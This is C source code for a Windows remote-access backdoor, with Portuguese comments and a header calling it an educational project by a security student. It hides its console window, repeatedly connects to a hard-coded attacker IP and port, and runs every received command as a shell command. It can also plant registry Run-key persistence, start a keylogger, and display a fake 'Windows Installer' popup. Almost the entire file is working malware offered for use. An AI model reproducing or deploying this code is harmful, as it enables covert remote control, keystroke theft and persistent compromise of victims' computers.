/*
Criado por Jean(Kripto-Sec) estudante de segurança da informação
Criado apenas para fins educativos não use para beneficio proprio
Apenas para estudo 
github: https://github.com/Kripto-Sec
bom estudo
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

int bootRun()
{
    char err[128] = "Erro\n";
    char suc[128] = "Persistencia Criada em : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0){
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;
    //quando chamado cria um NewVal Hkey onde a persistencia sera inserida
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    //caso queira modifique o campo "TEXT" para o nome de sua preferencia
    if (RegSetValueEx(NewVal, TEXT("Hackeado"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc),0);
    return 0;
}

char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}

//vai ser usada para dar comandos ao sistema
void Shell(){
    //criando 3 variais para ser chamada la em baixo
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1){
        jump:
        bzero(buffer, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        recv(sock, buffer, 1024, 0);

        //strncmp para compara se a string q e igual ao buffer para fechar a conecxao
        if (strncmp("q", buffer, 1) == 0){
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0){
            chdir(str_cut(buffer,3,100));

        }else if (strncmp("persistence", buffer, 11) == 0){
            bootRun();
        }
        else if (strncmp("keylog_start", buffer, 12) == 0){
            HANDLE thread = CreateThread(NULL, 0,logg, NULL, 0, NULL);
            goto jump;
        }
        else {

            //aqui ta basicamente dizendo para ler esse buffer e executalo
            FILE *fp;
            fp = _popen(buffer, "r");
            while(fgets(container,1024,fp) != NULL){
                strcat(total_response,container);

            }
            send(sock,total_response, sizeof(total_response), 0);
            fclose(fp);
        }

    }
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServePort;
    char *ServeIP;
    WSADATA wsaData;

    //definindo o ip atacante e a porta
    ServeIP = "192.168.0.105";
    ServePort = 50005;

     /*A estrutura WSADATA contem informacoes sobre
     A implementacao do windows sockets
     O parametro MAKEWORD(2,0) de WSAStartup faz uma solicitacao
     Para a versao do 2.0 do winsock no sistema e define a versao aprovada
     Como a versao mais alta do suporte windows socket que podemos usar */
    if (WSAStartup(MAKEWORD(2,0), &wsaData ) != 0){
        exit(1);
    }
    //definindo o object socket fora da main func
    //pq vamos usar ele em outras func
    sock = socket(AF_INET, SOCK_STREAM, 0);

    //usando o manset para limpar as var 0
    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServeIP);
    ServAddr.sin_port = htons(ServePort);


    //loop que tenta conectar
    start:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
    {
        sleep(10);
        goto start;

    }
    //comente esta parte caso nao queira um popup
    MessageBox(NULL, TEXT("Voce foi hackeado parabens!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
    //chama a shell la em cima
    Shell();
}
